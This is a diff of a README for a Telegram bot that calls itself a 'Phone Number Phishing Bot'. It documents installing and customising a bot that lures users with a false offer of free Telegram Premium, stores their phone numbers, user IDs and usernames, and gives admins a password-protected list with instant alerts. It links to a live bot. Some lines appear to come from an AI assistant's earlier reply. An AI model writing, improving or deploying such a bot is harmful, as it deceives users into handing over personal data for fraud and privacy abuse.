@@ -1,7 +1,7 @@
 # Phone Number Phishing Bot for Telegram Premium 🤖
 
-Python: 3.9+  
-Telegram Bot API
+**Python:** 3.9+  
+**Telegram Bot API**
 
 ---
 
@@ -12,7 +12,7 @@ Telegram Bot API
 - [Installation](#installation-) 💻  
 - [Usage](#usage-) 📱  
 - [Settings](#settings-) 🔧  
-- [License](#license-) 📜  
+- [License](#license-) 🌟  
 - [Example Use Cases](#example-use-cases-) 🖍️  
 - [Code Structure](#code-structure-) 🗂️  
 - [API Documentation](#api-documentation-) 📚  
@@ -23,8 +23,8 @@ Telegram Bot API
 
 ## Introduction 🤔
 
-This is a Telegram bot designed to encourage users to share their phone numbers in exchange for free access to Telegram Premium 🤝.  
-The bot uses the Telegram Bot API to communicate with users and stores their phone numbers along with user IDs and usernames 📱.
+This is a Telegram bot designed to **collect phone numbers** in exchange for free access to **Telegram Premium** 🤝.  
+The bot uses the **Telegram Bot API** to communicate with users and **stores their phone numbers** along with user IDs and usernames 📱.
 
 You can edit the text, the buttons requesting the phone number share, and the image displayed in the bot.
 
@@ -36,11 +36,11 @@ You can edit the text, the buttons requesting the phone number share, and the im
 
 ## Features 🎉
 
-- Offers free access to Telegram Premium to users 🤝.  
-- Users can share their phone number to receive free access 📞.  
-- Admins can view a list of users who shared their phone numbers using the `/show` command 👀.  
-- The bot uses a password to protect the `/show` command 🔒.  
-- The bot sends an opening message with an image and a button to share the phone number 📸.
+- Offers **free Telegram Premium access** to users 🤝.  
+- Users can **share their phone numbers** to claim Telegram Premium 📞.  
+- Admins can view a **live list of users** who shared their numbers using `/show` **password-protected** 🔒.  
+- **Real-time notifications** ⚡️: Admins who enter `/show 555222` get **notified instantly** when a new user shares their number! 📢  
+- The bot sends a **welcome message** with an image and a button to share the phone number 📸.
 
 ---
 
@@ -57,20 +57,15 @@ To install the bot, follow these steps:
 2. **Install Python**:  
    Make sure you have Python 3.9 or higher. You can download it from the official site: [Python.org](https://www.python.org/downloads/)
 
-3. **Install the python-telegram-bot library**:  
+3. **Install dependencies**:  
    ```bash  
-   pip install python-telegram-bot==13.15  
+   pip install -r requirements.txt  
    ```
 
-4. **Install other dependencies**:  
-   ```bash  
-   pip install -r req.txt  
-   ```
-
-5. **Replace the bot token**:  
+4. **Replace the bot token**:  
    Replace `YOUR_BOT_TOKEN` with your bot token in the `bot.py` file.
 
-6. **Run the bot**:  
+5. **Run the bot**:  
    ```bash  
    python bot.py  
    ```
@@ -86,14 +81,15 @@ To install the bot, follow these steps:
    Click the button to share your phone number.
 
 3. **Admin commands**:  
-   - `/show {PASSWORD}`: View the list of users who shared their phone numbers.
+   - `/show 555222` 🔒: View the **list of users** who shared their phone numbers.  
+   - **Get real-time notifications** ⚡️: Any admin who enters `/show 555222` gets **instant alerts** when a new user is added.
 
 ---
 
 ## Settings 🔧
 
 ### Update Password  
-You can update the password for the `/show` command in the `bot.py` file by changing the value of `password` 🔒.
+You can update the password for the `/show` command in the `bot.py` file by changing the value of `PASSWORD` 🔒.
 
 ### Change the Opening Image  
 - Replace the image in the folder with your own image.  
@@ -121,24 +117,25 @@ button_text = "🎁 Join Telegram Premium for free now!"
 ### Change Welcome Message  
 - Update the welcome message text in the code:  
   ```python  
-  caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"  
-           "Get 3 months free of Telegram Premium!\n\n"  
-           "Click the button below to share your phone number 📱.\n\n"  
-           "Enjoy! 😊")  
+  WELCOME_CAPTION = ("\n\n🎉 Welcome to Free Telegram Premium 🎉\n"  
+                      "Get 3 months free of Telegram Premium! \n\n"  
+                      "Click the button below to share your phone number 📱.\n\n"  
+                      "Enjoy! 😊")  
   ```
 
 ---
 
-## License 📜
+## License 🌟
 
-This project is licensed under the MIT License 📜. See the LICENSE file for details.
+This project is licensed under the MIT License 🌟. See the LICENSE file for details.
 
 ---
 
 ## Example Use Cases 🖍️
 
 - Users share their phone numbers for Telegram Premium access 📞.  
-- Admins use the `/show` command to view the list of users 👀.
+- Admins use the `/show` command to view the **real-time** list of users 👁.  
+- **Instant notifications** alert admins whenever a new user shares their number 📢.
 
 ---
 
@@ -158,7 +155,9 @@ The bot uses the Telegram API. You can find the full documentation here: [Telegr
 ## Commit Messages 🖍️
 
 - `feat`: Added a new feature 🎉  
-- `fix`: Fixed a bug 🚨
+- `fix`: Fixed a bug 🚨  
+- `docs`: Updated documentation 📄  
+- `refactor`: Code improvements without changing functionality ⚙️
 
 ---
 
@@ -168,6 +167,4 @@ The bot uses the Telegram API. You can find the full documentation here: [Telegr
 - Visit the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)
 
 ---
-```
 
-This updated version includes the **Settings** section on how to change the **button text** in your bot. You can now easily customize the text of the button that users press to share their phone number!
